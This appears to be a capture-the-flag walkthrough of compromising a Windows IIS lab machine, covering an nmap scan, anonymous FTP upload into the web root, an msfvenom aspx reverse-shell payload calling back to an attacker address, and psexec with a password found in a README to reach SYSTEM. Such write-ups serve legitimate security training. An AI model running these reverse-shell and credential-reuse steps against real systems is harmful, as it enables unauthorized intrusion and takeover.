First things first, lets run our nmap scan.  I use a custom script that scans for ports then passes those open ports to nmap for service enumeration, however you can achieve the same results with the below command.

`nmap -p- -A 172.31.1.11`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/02e3276d-a263-4c23-8b13-682f001170d6/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/02e3276d-a263-4c23-8b13-682f001170d6/Untitled.png)

Looks like we have serveral interesting ports open.  First thing I notice in the nmap output if the FTP results.  It looks like the contents for anonymous login are files found in a default IIS page.  We have IIS running on port 80 so lets see if it is a default page or not.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/763d8630-6a04-4d9c-b5e5-cc2773cccc6a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/763d8630-6a04-4d9c-b5e5-cc2773cccc6a/Untitled.png)

It is!  Lets test and see if this FTP server is linked to the root of this web server.  We can test this by putting a file on the server via FTP and then access it via HTTP.  If it works, we may be able to execute a script via HTTP that could give us a shell!

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d6d9124-62cd-4d05-81a2-40be65fa48d9/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d6d9124-62cd-4d05-81a2-40be65fa48d9/Untitled.png)

I was getting an error saying the server cannot accept the argument **ls** which I had never seen before.  I looked this up and decided to see what wireshark showed when I sent the **ls** command.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a075f964-15d1-4b66-ad4f-6167fcbd6903/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a075f964-15d1-4b66-ad4f-6167fcbd6903/Untitled.png)

It looks like it is using the **PORT** command with some arguments which I'm not for sure why.  I read up and someone suggested to try in passive mode.  So I switched and now everything seems good.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/156d9a21-0b4c-4bdb-9b82-094d979ce272/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/156d9a21-0b4c-4bdb-9b82-094d979ce272/Untitled.png)

I put the file **test.txt** on the server via FTP and accessed with HTTP successfully.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7f85bf5-84b0-4b4f-9aaf-2c3384099829/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b7f85bf5-84b0-4b4f-9aaf-2c3384099829/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26595f6b-9175-4131-b3e9-9554d3353c07/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/26595f6b-9175-4131-b3e9-9554d3353c07/Untitled.png)

Now lets try to generate an aspx payload with **msfvenom**.  We will use a x64 payload first and see what we get.  If it fails we may try an x86 instead.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.0.11 LPORT=1337 -f aspx > shell.aspx`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45287cdf-585c-4cde-b26b-8526f3b57bf8/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45287cdf-585c-4cde-b26b-8526f3b57bf8/Untitled.png)

Now we will copy the payload to the server, start a netcat listener, and execute via HTTP.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad3dad4a-79d7-409c-88a7-363302ec0473/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ad3dad4a-79d7-409c-88a7-363302ec0473/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/854a6623-5c86-4b42-b6cd-832773282672/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/854a6623-5c86-4b42-b6cd-832773282672/Untitled.png)

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e83c9ef-15ad-45ba-a688-cfdb2ce82432/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5e83c9ef-15ad-45ba-a688-cfdb2ce82432/Untitled.png)

We have a shell as low level user.  Awesome!  Now time to escalate.

After some manual enumeration, we find a directory on the root of the hard drive called **Development** which looks interesting.  Inside is a file called **README.txt** so lets look at its contents.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/585171d9-faeb-4be5-9f59-9acfe63fa066/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/585171d9-faeb-4be5-9f59-9acfe63fa066/Untitled.png)

Hmmm.  Looks like someone is using an insecure password.  We can assume it is not the administrator account since this note seems to be signed by the Administrator.  Lets look and see what users we may have on this machine.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f24db7b1-7ca5-4d50-ae31-0896b1633fbd/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f24db7b1-7ca5-4d50-ae31-0896b1633fbd/Untitled.png)

Since we are current Alpha Site, lets see if we can authenticate with Web Admin.  I tried a few default passwords like **admin**, **password**, etc. All failed and I thought I would try to brute force untill I tried "**Password"** which is what was in the **README** file.  I got a message saying it could not access because of insufficient user privileges.  This is good as it indicates we have a valid set of creds, just can't be used via RDP.

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5de8e107-259b-4b9a-bc86-16a24d7f7fb2/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5de8e107-259b-4b9a-bc86-16a24d7f7fb2/Untitled.png)

So since we have SMB services running, lets try to get a shell with **psexec**

[`psexec.py](http://psexec.py/) 'Web Admin':'Password'@172.31.1.11`

![https://s3-us-west-2.amazonaws.com/secure.notion-static.com/68befef3-4cdb-47b3-ac6d-c5f043299a4a/Untitled.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/68befef3-4cdb-47b3-ac6d-c5f043299a4a/Untitled.png)

There we go.  We are now System on the machine!
